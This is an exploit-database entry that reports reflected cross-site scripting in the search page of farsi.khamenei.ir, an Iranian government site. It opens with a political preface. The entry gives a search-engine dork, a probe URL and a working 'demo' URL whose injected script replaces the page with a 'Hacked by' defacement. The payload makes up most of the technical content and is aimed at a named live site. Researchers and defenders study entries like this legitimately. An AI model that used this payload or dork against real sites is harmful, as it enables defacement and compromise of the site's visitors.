---
title: Khameneie.ir XSS vulnerabilities
url: https://cxsecurity.com/issue/WLB-2022100062
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-24
fetch_date: 2025-10-03T20:42:42.027774
---

# Khameneie.ir XSS vulnerabilities

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Khameneie.ir XSS vulnerabilities** **2022.10.23**  **![ua](https://cert.cx/cxstatic/images/flags/ua.png) [E1.Coders](https://cxsecurity.com/author/E1.Coders/1/) **(UA)** ![ua](https://cert.cx/cxstatic/images/flags/ua.png)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A**  **[**Dork:** site:farsi.khamenei.ir/search-result?q="](https://cxsecurity.com/dorks/)** | |

-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*
confidential "Top Secret"
This message is written to describe the security issue and is confidential and should not be included in the report
This site belongs to the organization of the leader of the Islamic Republic of Iran "Khamenei".
who ordered the killing of Mehsa Amini, a 22-year-old Iranian woman, and she was killed by the moral police, and the people protested in the streets, and now the Iranian police are trying to identify these people.
This site has a security issue with an XSS vulnerability.
We have reported many times to this site that it has a security problem and it has ignored our report.
We want to definitely register and report this security issue
-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*-\*
################################################## ################################################## #####################
# #
# Exploit Title : Khameneie.ir has XSS vulnerabilities #
# #
# Author : E1.Coders #
# #
# Contact : E1.Coders [at] Mail [dot] RU #
# #
# Portal Link : khamenei.ir (https://farsi.khamenei.ir) #
# #
# Tested ON : All language version Host #
# #
# Security Risk : ~[Critical]~ #
# #
# Description : Description: All websites with this version used can be targeted #
# #
# DorK : "intext:"site:farsi.khamenei.ir/search-result?q=" #
# # site:farsi.khamenei.ir/search-result?q=YOUR KEYWORD&
# #
# #
################################################## ################################################## #####################
Details :
the vulnerable file is "book-archive"
XSS Expl0iTs :
https://farsi.khamenei.ir/search-result?q=%3CXSS%20SCRIPT%3E&nt=99,101,2,4,9,1,16,
Dem0 :
https://farsi.khamenei.ir/search-result?q=%3C/script%3E%3Cscript%3Edocument.documentElement.innerHTML=%22%3Ccenter%3E%3Ch1%3EHacked%20by%20E1.Coders%3C/h1%3E%3Cimg%20src=%27https://cybercrimemag.wpenginepowered.com/wp-content/uploads/2018/11/Keyboard-Typing-700x467.jpg%27%3E%3Ccenter%3E%3Ch2%3ERUSSIAN%20-%20BLACK%20-%HAT%20%3C/h2%3E%3C/center%3E%3Ch2%3ESECURITY\_is\_Low%20~Fuck~%3C/h2%3E%3C/center%3E%22%3C/script%3E&nt=99,101,2,4,9,1,16

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100062)

[Tweet](https://twitter.com/share)

Vote for this issue:
 14
 -2

87%

13%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top